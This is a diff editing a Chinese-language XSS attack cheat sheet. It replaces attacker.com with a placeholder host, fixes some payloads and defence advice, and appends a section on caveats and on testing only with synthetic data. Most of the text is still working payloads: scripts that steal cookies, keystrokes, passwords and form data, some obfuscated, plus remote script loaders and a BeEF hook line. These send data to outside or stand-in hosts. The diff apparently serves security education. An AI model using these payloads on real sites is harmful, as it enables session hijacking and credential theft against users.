@@ -57,9 +57,9 @@ _反射型跨站脚本攻击技术_
 **4. 窃取Cookie**
 > 窃取用户Cookie
 ```
-<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
-<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
-<script>location="http://attacker.com/steal?c="+document.cookie</script>
+<script>new Image().src="https://collector.example.invalid/steal?c="+document.cookie</script>
+<script>fetch("https://collector.example.invalid/steal?c="+document.cookie)</script>
+<script>location="https://collector.example.invalid/steal?c="+document.cookie</script>
 ```
 **语法解析：**
 - `document.cookie` — 获取当前页面Cookie _function_
@@ -71,7 +71,7 @@ _反射型跨站脚本攻击技术_
 ```
 <script>
 document.onkeypress=function(e){
-  fetch("http://attacker.com/log?key="+e.key)
+  fetch("https://collector.example.invalid/log?key="+e.key)
 }
 </script>
 ```
@@ -203,7 +203,7 @@ _存储型跨站脚本攻击技术_
 if(!window.xss_loaded){
   window.xss_loaded=true;
   var s=document.createElement("script");
-  s.src="http://attacker.com/evil.js";
+  s.src="https://collector.example.invalid/evil.js";
   document.body.appendChild(s);
 }
 </script>
@@ -264,11 +264,11 @@ document.body.appendChild(s);
 **Math标签绕过**
 > 使用MathML标签
 ```
-<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">click</maction></math>
+<math><maction actiontype="statusline#https://collector.example.invalid" xlink:href="javascript:alert(1)">click</maction></math>
 ```
 **语法解析：**
 - `<math>` — HTML标签/事件处理器 _tag_
-- `<maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">` — HTML标签/事件处理器 _tag_
+- `<maction actiontype="statusline#https://collector.example.invalid" xlink:href="javascript:alert(1)">` — HTML标签/事件处理器 _tag_
 - `click` — 注入代码 _value_
 - `</maction>` — HTML标签/事件处理器 _tag_
 - `</math>` — HTML标签/事件处理器 _tag_
@@ -285,7 +285,7 @@ document.body.appendChild(s);
 4. 自动执行恶意操作
 
 **防御措施：** 防御措施：
-1. 存储前进行HTML编码
+1. 保留数据语义，输出时按上下文编码；允许富文本时使用维护中的 HTML 净化器
 2. 输出时进行上下文编码
 3. 使用CSP策略
 4. 定期扫描存储内容
@@ -331,12 +331,12 @@ $(location.hash)
 **3. location.hash利用**
 > 利用location.hash
 ```
-URL: http://target.com/#<img src=x onerror=alert(1)>
+URL: https://target.example.invalid/#<img src=x onerror=alert(1)>
 如果页面有: document.write(location.hash)
 则触发XSS
 ```
 **语法解析：**
-- `URL: http://target.com/#` — 注入代码 _value_
+- `URL: https://target.example.invalid/#` — 注入代码 _value_
 - `<img src=x onerror=alert(1)>` — HTML标签/事件处理器 _tag_
 - `
 如果页面有: document.write(location.hash)
@@ -506,7 +506,7 @@ Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.examp
 **6. Dangling Markup**
 > 利用悬挂标记窃取数据
 ```
-<img src='http://attacker.com/?
+<img src='https://collector.example.invalid/?
 捕获后续HTML内容直到遇到单引号
 ```
 **语法解析：**
@@ -537,18 +537,18 @@ Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.examp
 > 利用CSP未限制base-uri指令劫持脚本加载源，或通过CSS注入/DOM接口泄露script nonce值
 ```
 # base-uri未限制时:
-<base href="http://attacker.com/">
+<base href="https://collector.example.invalid/">
 # 页面中相对路径的脚本将从attacker.com加载
 
 # nonce泄露利用:
 # 通过CSS注入窃取nonce:
-<style>script[nonce^="a"]{background:url(http://attacker.com/?n=a)}</style>
+<style>/* 现代 nonce 隐藏机制使这种 CSS 属性选择器窃取假设不成立 */</style>
 # 或通过DOM读取: document.querySelector("script[nonce]").nonce
 ```
 **语法解析：**
 - `# base-uri未限制时:
 ` — 注入代码 _value_
-- `<base href="http://attacker.com/">` — HTML标签/事件处理器 _tag_
+- `<base href="https://collector.example.invalid/">` — HTML标签/事件处理器 _tag_
 - `
 # 页面中相对路径的脚本将从attacker.com加载
 
@@ -556,7 +556,7 @@ Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.examp
 # 通过CSS注入窃取nonce:
 ` — 注入代码 _value_
 - `<style>` — HTML标签/事件处理器 _tag_
-- `script[nonce^="a"]{background:url(http://attacker.com/?n=a)}` — 注入代码 _value_
+- `/* 现代 nonce 隐藏机制使这种 CSS 属性选择器窃取假设不成立 */` — 注入代码 _value_
 - `</style>` — HTML标签/事件处理器 _tag_
 - `
 # 或通过DOM读取: document.querySelector("script[nonce]").nonce` — 注入代码 _value_
@@ -685,7 +685,7 @@ _利用Unicode编码特性绕过过滤_
 > JavaScript Unicode转义
 ```
 <script>\u0061lert(1)</script>
-<script>\x61lert(1)</script>
+[无效 JS 标识符：\x61 转义只适用于字符串等相应语法位置]
 <script>\u{61}lert(1)</script>
 ```
 **语法解析：**
@@ -951,7 +951,7 @@ _利用各种编码技术绕过XSS过滤_
 > JavaScript编码
 ```
 <img src=x onerror="\u0061lert(1)">
-<img src=x onerror="\x61lert(1)">
+[无效事件处理器：\x61 不能作为标识符转义]
 <img src=x onerror="eval(atob('YWxlcnQoMSk='))">
 ```
 **语法解析：**
@@ -1112,7 +1112,7 @@ _利用XSS窃取用户Cookie_
 **1. 基础Cookie窃取**
 > 使用Image对象发送Cookie
 ```
-<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
+<script>new Image().src="https://collector.example.invalid/steal?c="+document.cookie</script>
 ```
 **语法解析：**
 - `new Image()` — 创建图片对象 _function_
@@ -1122,8 +1122,8 @@ _利用XSS窃取用户Cookie_
 **2. Fetch API窃取**
 > 使用Fetch/Beacon API
 ```
-<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
-<script>navigator.sendBeacon("http://attacker.com/steal", document.cookie)</script>
+<script>fetch("https://collector.example.invalid/steal?c="+document.cookie)</script>
+<script>navigator.sendBeacon("https://collector.example.invalid/steal", document.cookie)</script>
 ```
 **语法解析：**
 - `fetch()` — 现代HTTP请求API _function_
@@ -1134,7 +1134,7 @@ _利用XSS窃取用户Cookie_
 ```
 <script>
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);
+xhr.open("GET", "https://collector.example.invalid/steal?c="+document.cookie, true);
 xhr.send();
 </script>
 ```
@@ -1142,7 +1142,7 @@ xhr.send();
 - `<script>` — HTML标签/事件处理器 _tag_
 - `
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);
+xhr.open("GET", "https://collector.example.invalid/steal?c="+document.cookie, true);
 xhr.send();
 ` — 注入代码 _value_
 - `</script>` — HTML标签/事件处理器 _tag_
@@ -1152,7 +1152,7 @@ xhr.send();
 ```
 <script>
 var data = btoa(document.cookie);
-new Image().src="http://attacker.com/steal?c="+data;
+new Image().src="https://collector.example.invalid/steal?c="+data;
 </script>
 ```
 **语法解析：**
@@ -1163,14 +1163,14 @@ new Image().src="http://attacker.com/steal?c="+data;
 ```
 <script>
 var img = new Image();
-img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
+img.src = "https://collector.example.invalid/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
 </script>
 ```
 **语法解析：**
 - `<script>` — HTML标签/事件处理器 _tag_
 - `
 var img = new Image();
-img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
+img.src = "https://collector.example.invalid/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
 ` — 注入代码 _value_
 - `</script>` — HTML标签/事件处理器 _tag_
 
@@ -1179,11 +1179,11 @@ img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie
 **混淆绕过**
 > 变量混淆绕过
 ```
-<script>var _0x1234="cookie";eval("new Image().src=\"http://attacker.com/?c="+document[_0x1234]+"\"")</script>
+<script>var _0x1234="cookie";eval("new Image().src=\"https://collector.example.invalid/?c="+document[_0x1234]+"\"")</script>
 ```
 **语法解析：**
 - `<script>` — HTML标签/事件处理器 _tag_
-- `var _0x1234="cookie";eval("new Image().src=\"http://attacker.com/?c="+document[_0x1234]+"\"")` — 注入代码 _value_
+- `var _0x1234="cookie";eval("new Image().src=\"https://collector.example.invalid/?c="+document[_0x1234]+"\"")` — 注入代码 _value_
 - `</script>` — HTML标签/事件处理器 _tag_
 
 
@@ -1220,7 +1220,7 @@ _利用XSS记录用户键盘输入_
 ```
 <script>
 document.addEventListener("keypress", function(e){
-  new Image().src = "http://attacker.com/log?key=" + e.key;
+  new Image().src = "https://collector.example.invalid/log?key=" + e.key;
 });
 </script>
 ```
@@ -1236,7 +1236,7 @@ document.addEventListener("keypress", function(e){
 var buffer = "";
 document.addEventListener("keydown", function(e){
   if(e.key === "Enter"){
-    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);
+    new Image().src = "https://collector.example.invalid/log?data=" + encodeURIComponent(buffer);
     buffer = "";
   } else {
     buffer += e.key;
@@ -1250,7 +1250,7 @@ document.addEventListener("keydown", function(e){
 var buffer = "";
 document.addEventListener("keydown", function(e){
   if(e.key === "Enter"){
-    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);
+    new Image().src = "https://collector.example.invalid/log?data=" + encodeURIComponent(buffer);
     buffer = "";
   } else {
     buffer += e.key;
@@ -1265,7 +1265,7 @@ document.addEventListener("keydown", function(e){
 <script>
 document.querySelectorAll("input[type=password]").forEach(function(input){
   input.addEventListener("change", function(){
-    new Image().src = "http://attacker.com/log?pwd=" + this.value;
+    new Image().src = "https://collector.example.invalid/log?pwd=" + this.value;
   });
 });
 </script>
@@ -1282,7 +1282,7 @@ document.querySelectorAll("input[type=password]").forEach(function(input){
 document.querySelectorAll("form").forEach(function(form){
   form.addEventListener("submit", function(e){
     var data = new FormData(this);
-    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();
+    new Image().src = "https://collector.example.invalid/log?" + new URLSearchParams(data).toString();
   });
 });
 </script>
@@ -1293,7 +1293,7 @@ document.querySelectorAll("form").forEach(function(form){
 document.querySelectorAll("form").forEach(function(form){
   form.addEventListener("submit", function(e){
     var data = new FormData(this);
-    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();
+    new Image().src = "https://collector.example.invalid/log?" + new URLSearchParams(data).toString();
   });
 });
 ` — 注入代码 _value_
@@ -1304,11 +1304,11 @@ document.querySelectorAll("form").forEach(function(form){
 **混淆版本**
 > 十六进制混淆
 ```
-<script>var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})</script>
+<script>var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="https://collector.example.invalid/?k="+_0xb[_0xa[0]]})</script>
 ```
 **语法解析：**
 - `<script>` — HTML标签/事件处理器 _tag_
-- `var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})` — 注入代码 _value_
+- `var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="https://collector.example.invalid/?k="+_0xb[_0xa[0]]})` — 注入代码 _value_
 - `</script>` — HTML标签/事件处理器 _tag_
 
 
@@ -1324,7 +1324,7 @@ document.querySelectorAll("form").forEach(function(form){
 
 **防御措施：** 防御措施：
 1. 严格的XSS防护
-2. 使用虚拟键盘输入敏感信息
+2. 修复注入源与危险 DOM sink；虚拟键盘不能阻止恶意脚本读取输入值
 3. 实施内容安全策略
 4. 监控异常脚本行为
 
@@ -1363,7 +1363,7 @@ bundle install` — 攻击载荷 _value_
 **2. 注入Hook脚本**
 > 注入BeEF Hook
 ```
-<script src="http://attacker.com:3000/hook.js"></script>
+<script src="https://collector.example.invalid:3000/hook.js"></script>
 注入短版本:
 <script src="//attacker.com:3000/hook.js"></script>
 ```
@@ -1385,7 +1385,7 @@ beef> run social_engineering fake_notification
 beef> run browser get_cookies
 
 # 重定向页面
-beef> run browser redirect https://evil.com
+beef> run browser redirect https://collector.example.invalid
 ```
 **语法解析：**
 - `# BeEF控制台常用命令
@@ -1463,3 +1463,13 @@ beef> run social_engin` — 攻击载荷 _value_
 4. 安全意识培训
 
 ---
+
+
+## 复核后的上下文限制
+
+- HTML 编码不是 JavaScript/CSS/URL 的通用编码器。按最终 sink 编码，URL 还须验证 scheme；需要 HTML 时使用维护中的净化器，普通文本使用 textContent。输入反射或 alert 字符串出现不等于执行证据。
+- `unsafe-eval` 只放宽字符串求值限制，不允许原本被禁止的内联 script；有效 nonce/hash 策略也会影响 unsafe-inline。CSP 报告模式不执行阻断。现代浏览器隐藏 nonce 属性值以防 CSS 选择器泄漏；读取 `.nonce` 本身已需要可执行脚本。base 标签仍受 script-src 等策略限制。
+- HTML 实体在属性上下文与 script 原始文本中的解释不同；URL 百分号编码不会自动在事件处理器内再次解码。`&lt;script&gt;` 作为普通 HTML 文本不会自动变成标签。全角字符、NUL、非最短 UTF-8、UTF-7、CSS expression、旧 MathML/AngularJS 链都不能当作现代浏览器的通用向量。
+- innerHTML 插入的 script 标签通常不执行，但事件处理器等 sink 仍有风险。现代 location.hash 的转义/解码路径和 jQuery 版本必须核实。data URL 文档通常有独立不透明 origin，不能据其脚本执行推定在目标 origin 执行。重复 id 本身不证明 clobbering 可利用；mXSS 需给出具体净化器/浏览器版本及实际解析前后差异。
+- HttpOnly 只阻止脚本读取相应 Cookie，不修复 XSS 或阻止同源操作。Cookie 受域/路径/有效期限制，读到值不证明能重放会话；SameSite/Secure 也不是 XSS 修复。
+- 这些外带、hook 与按键片段是风险说明，不用于实际用户数据。只在隔离页面中使用固定合成 canary，不采集 Cookie、密码或表单内容，存储型测试后清理夹具。键盘事件不是全部输入，自动填充、粘贴和跨 origin 文档另有边界。BeEF 的示意命令/默认凭据未验证，不能当作已安装版本接口；浏览器 JS 不具备任意 ARP 欺骗能力。本次没有打开或执行这些 HTML/脚本。
